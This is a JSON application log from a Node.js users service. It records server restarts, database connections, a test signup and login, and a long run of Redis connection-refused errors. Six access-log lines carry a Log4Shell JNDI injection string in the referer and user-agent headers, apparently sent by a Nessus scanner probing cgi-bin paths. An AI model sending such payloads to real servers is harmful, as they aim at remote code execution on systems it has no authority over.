{"level":"info","message":"Server started on port 8001","timestamp":"2025-11-29 14:27:48"}
{"level":"info","message":"gRPC Server running on port 50052","timestamp":"2025-11-29 14:27:48"}
{"level":"info","message":"Connected to Redis","timestamp":"2025-11-29 14:27:48"}
{"level":"info","message":"Connected to MongoDB","timestamp":"2025-11-29 14:27:49"}
{"body":{"city":"Test City","email":"cachetest1764406677146@example.com","name":"Cache Tester","password":"password123","phone":"9876543210","role":"retailer"},"level":"info","message":"Signup attempt","timestamp":"2025-11-29 14:27:57"}
{"level":"info","message":"Signup successful","role":"retailer","timestamp":"2025-11-29 14:27:57","userId":"692ab595d550c034e0e68f07"}
{"level":"info","message":"::1 - - [29/Nov/2025:08:57:57 +0000] \"POST /offerzone/users/ HTTP/1.1\" 201 457 \"-\" \"axios/1.13.2\"","timestamp":"2025-11-29 14:27:57"}
{"level":"info","message":"Server started on port 8001","timestamp":"2025-11-29 14:31:30"}
{"error":"No address added out of total 1 resolved errors: [listen EADDRINUSE: address already in use 0.0.0.0:50052]","level":"error","message":"gRPC Server bind error","timestamp":"2025-11-29 14:31:30"}
{"level":"info","message":"Connected to Redis","timestamp":"2025-11-29 14:31:30"}
{"level":"info","message":"Connected to MongoDB","timestamp":"2025-11-29 14:31:30"}
{"level":"info","message":"Server started on port 8001","timestamp":"2025-11-29 14:36:36"}
{"level":"info","message":"gRPC Server running on port 50052","timestamp":"2025-11-29 14:36:36"}
{"level":"info","message":"Connected to Redis","timestamp":"2025-11-29 14:36:36"}
{"level":"info","message":"Connected to MongoDB","timestamp":"2025-11-29 14:36:36"}
{"level":"info","message":"Server started on port 8001","timestamp":"2025-11-29 15:05:57"}
{"level":"info","message":"gRPC Server running on port 50052","timestamp":"2025-11-29 15:05:57"}
{"level":"info","message":"Connected to MongoDB","timestamp":"2025-11-29 15:05:57"}
{"level":"info","message":"Server started on port 8001","timestamp":"2025-11-29 15:10:08"}
{"level":"info","message":"gRPC Server running on port 50052","timestamp":"2025-11-29 15:10:08"}
{"level":"info","message":"Connected to Redis","timestamp":"2025-11-29 15:10:08"}
{"level":"info","message":"Connected to MongoDB","timestamp":"2025-11-29 15:10:08"}
{"level":"info","message":"Server started on port 8001","timestamp":"2025-11-29 15:11:09"}
{"level":"info","message":"gRPC Server running on port 50052","timestamp":"2025-11-29 15:11:09"}
{"level":"info","message":"Connected to Redis","timestamp":"2025-11-29 15:11:09"}
{"level":"info","message":"Connected to MongoDB","timestamp":"2025-11-29 15:11:09"}
{"email":"string","level":"info","message":"Login attempt","timestamp":"2025-11-29 15:13:06"}
{"level":"info","message":"Login successful","role":"retailer","timestamp":"2025-11-29 15:13:06","userId":"6925f7ca613588a87d2963c7"}
{"level":"info","message":"::1 - - [29/Nov/2025:09:43:06 +0000] \"POST /offerzone/users/session HTTP/1.1\" 200 381 \"http://localhost:8085/api-docs/\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36\"","timestamp":"2025-11-29 15:13:06"}
{"level":"info","message":"Server started on port 8001","timestamp":"2025-11-29 15:41:20"}
{"level":"info","message":"gRPC Server running on port 50052","timestamp":"2025-11-29 15:41:20"}
{"level":"info","message":"Connected to Redis","timestamp":"2025-11-29 15:41:20"}
{"level":"info","message":"Connected to MongoDB","timestamp":"2025-11-29 15:41:21"}
{"level":"info","message":"Server started on port 8001","timestamp":"2025-11-29 15:43:53"}
{"level":"info","message":"gRPC Server running on port 50052","timestamp":"2025-11-29 15:43:53"}
{"level":"info","message":"Connected to Redis","timestamp":"2025-11-29 15:43:53"}
{"level":"info","message":"Connected to MongoDB","timestamp":"2025-11-29 15:43:54"}
{"level":"info","message":"Server started on port 8001","timestamp":"2025-11-29 17:00:49"}
{"level":"info","message":"gRPC Server running on port 50052","timestamp":"2025-11-29 17:00:49"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:00:49"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:00:49"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:00:49"}
{"level":"info","message":"Connected to MongoDB","timestamp":"2025-11-29 17:00:50"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:00:50"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:00:50"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:00:51"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:00:53"}
{"level":"info","message":"::ffff:10.33.29.38 - - [29/Nov/2025:11:30:54 +0000] \"GET /cgi-bin/clwarn.cgi HTTP/1.1\" 404 157 \"${jndi:ldap://log4shell-generic-GHIUmDs3skaZJ6TRQukW${lower:ten}.w.nessus.org/nessus}\" \"${jndi:ldap://log4shell-generic-GHIUmDs3skaZJ6TRQukW${lower:ten}.w.nessus.org/nessus}\"","timestamp":"2025-11-29 17:00:54"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:00:55"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:00:57"}
{"level":"info","message":"::ffff:10.33.29.38 - - [29/Nov/2025:11:30:59 +0000] \"GET /cgi-bin/count.cgi HTTP/1.1\" 404 156 \"${jndi:ldap://log4shell-generic-GHIUmDs3skaZJ6TRQukW${lower:ten}.w.nessus.org/nessus}\" \"${jndi:ldap://log4shell-generic-GHIUmDs3skaZJ6TRQukW${lower:ten}.w.nessus.org/nessus}\"","timestamp":"2025-11-29 17:00:59"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:00:59"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:01:01"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:01:03"}
{"level":"info","message":"::ffff:10.33.29.38 - - [29/Nov/2025:11:31:04 +0000] \"GET /cgi-bin/Count.cgi HTTP/1.1\" 404 156 \"${jndi:ldap://log4shell-generic-GHIUmDs3skaZJ6TRQukW${lower:ten}.w.nessus.org/nessus}\" \"${jndi:ldap://log4shell-generic-GHIUmDs3skaZJ6TRQukW${lower:ten}.w.nessus.org/nessus}\"","timestamp":"2025-11-29 17:01:04"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:01:06"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:01:08"}
{"level":"info","message":"::ffff:10.33.29.38 - - [29/Nov/2025:11:31:09 +0000] \"GET /cgi-bin/faqmanager.cgi HTTP/1.1\" 404 161 \"${jndi:ldap://log4shell-generic-GHIUmDs3skaZJ6TRQukW${lower:ten}.w.nessus.org/nessus}\" \"${jndi:ldap://log4shell-generic-GHIUmDs3skaZJ6TRQukW${lower:ten}.w.nessus.org/nessus}\"","timestamp":"2025-11-29 17:01:09"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:01:10"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:01:12"}
{"level":"info","message":"::ffff:10.33.29.38 - - [29/Nov/2025:11:31:14 +0000] \"GET /cgi-bin/FormHandler.cgi HTTP/1.1\" 404 162 \"${jndi:ldap://log4shell-generic-GHIUmDs3skaZJ6TRQukW${lower:ten}.w.nessus.org/nessus}\" \"${jndi:ldap://log4shell-generic-GHIUmDs3skaZJ6TRQukW${lower:ten}.w.nessus.org/nessus}\"","timestamp":"2025-11-29 17:01:14"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:01:14"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:01:16"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:01:18"}
{"level":"info","message":"::ffff:10.33.29.38 - - [29/Nov/2025:11:31:19 +0000] \"GET /cgi-bin/FormMail.cgi HTTP/1.1\" 404 159 \"${jndi:ldap://log4shell-generic-GHIUmDs3skaZJ6TRQukW${lower:ten}.w.nessus.org/nessus}\" \"${jndi:ldap://log4shell-generic-GHIUmDs3skaZJ6TRQukW${lower:ten}.w.nessus.org/nessus}\"","timestamp":"2025-11-29 17:01:19"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:01:20"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:01:23"}
{"level":"info","message":"::ffff:10.33.29.38 - - [29/Nov/2025:11:31:24 +0000] \"GET /cgi-bin/guestbook.cgi HTTP/1.1\" 404 160 \"${jndi:ldap://log4shell-generic-GHIUmDs3skaZJ6TRQukW${lower:ten}.w.nessus.org/nessus}\" \"${jndi:ldap://log4shell-generic-GHIUmDs3skaZJ6TRQukW${lower:ten}.w.nessus.org/nessus}\"","timestamp":"2025-11-29 17:01:24"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:01:25"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:01:27"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:01:29"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:01:31"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:01:33"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:01:35"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:01:37"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:01:39"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:01:42"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:01:44"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:01:46"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:01:48"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:01:50"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:01:52"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:01:54"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:01:56"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:01:59"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:02:01"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:02:03"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:02:05"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:02:07"}
{"level":"info","message":"Server started on port 8001","timestamp":"2025-11-29 17:02:30"}
{"level":"info","message":"gRPC Server running on port 50052","timestamp":"2025-11-29 17:02:30"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:02:30"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:02:30"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:02:30"}
{"level":"info","message":"Connected to MongoDB","timestamp":"2025-11-29 17:02:30"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:02:31"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:02:31"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:02:32"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:02:34"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:02:36"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:02:38"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:02:40"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:02:42"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:02:45"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:02:47"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:02:49"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:02:51"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:02:53"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:02:55"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:02:57"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:02:59"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:03:02"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:03:04"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:03:06"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:03:08"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:03:10"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:03:12"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:03:14"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:03:16"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:03:18"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:03:21"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:03:23"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:03:25"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:03:27"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:03:29"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:03:31"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:03:33"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:03:35"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:03:38"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:03:40"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:03:42"}
{"level":"info","message":"Server started on port 8001","timestamp":"2025-11-29 17:03:44"}
{"level":"info","message":"gRPC Server running on port 50052","timestamp":"2025-11-29 17:03:44"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:03:44"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:03:44"}
{"level":"info","message":"Connected to MongoDB","timestamp":"2025-11-29 17:03:45"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:03:45"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:03:45"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:03:45"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:03:46"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:03:48"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:03:50"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:03:52"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:03:54"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:03:56"}
{"code":"ECONNREFUSED","level":"error","message":"Redis Client Error","stack":"AggregateError [ECONNREFUSED]: \n    at internalConnectMultiple (node:net:1118:18)\n    at afterConnectMultiple (node:net:1685:7)","timestamp":"2025-11-29 17:03:58"}
